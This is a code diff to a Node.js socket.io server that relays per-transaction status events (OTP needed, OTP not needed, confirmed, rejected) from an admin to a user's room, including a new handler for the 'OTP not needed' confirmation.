@@ -120,12 +120,25 @@ io.on("connection", (socket) => {
         socket.join(roomName);
 
         // If admin already confirmed before user joined, sync to user
+        
         if (pendingConfirmations[transaction_id]) {
-            socket.emit("txn_confirmed", pendingConfirmations[transaction_id]);
-            console.log(
-                `Pushed existing confirmation to ${socket.id} for txn ${transaction_id}`
-            );
-        }
+  const data = pendingConfirmations[transaction_id];
+
+  if (data.status === "otpNotNeeded") {
+    socket.emit("otp_not_needed", data);
+  } else if (data.status === "confirmed") {
+    socket.emit("txn_confirmed", data);
+  } else if (data.status === "rejected") {
+    socket.emit("txn_rejected", data);
+  } else if (data.status === "otpNeeded") {
+    socket.emit("otp_needed", data);
+  }
+
+  console.log(
+    `Pushed existing confirmation to ${socket.id} for txn ${transaction_id}`
+  );
+}
+
 
         // Notify admins (optional)
         io.to("admins").emit("user_joined_room", {
@@ -134,7 +147,29 @@ io.on("connection", (socket) => {
         });
     });
      
-    
+    // Server-side: handle admin OTP-not-needed confirmation
+     socket.on("admin_confirm_otp_notneeded", (data) => {
+         console.log("Admin confirmed OTP not needed:", data);
+     
+         // Save in pending confirmations for sync if user joins later
+         pendingConfirmations[data.transaction_id] = {
+             ...data,
+             status: "otpNotNeeded"
+         };
+     
+         // User room
+         const roomName = `txn-${data.transaction_id}`;
+     
+         // Emit to that specific user
+         io.to(roomName).emit("otp_not_needed", {
+             ...data,
+             status: "otpNotNeeded"
+         });
+     
+         
+         console.log(`Broadcasted otp_not_needed to ${roomName}`);
+     });
+
     /* ------------------------ ADMIN CONFIRMS TRANSACTION ------------------------ */
     socket.on("admin_confirm_txn", (data) => {
         console.log("Admin confirmed transaction:", data);
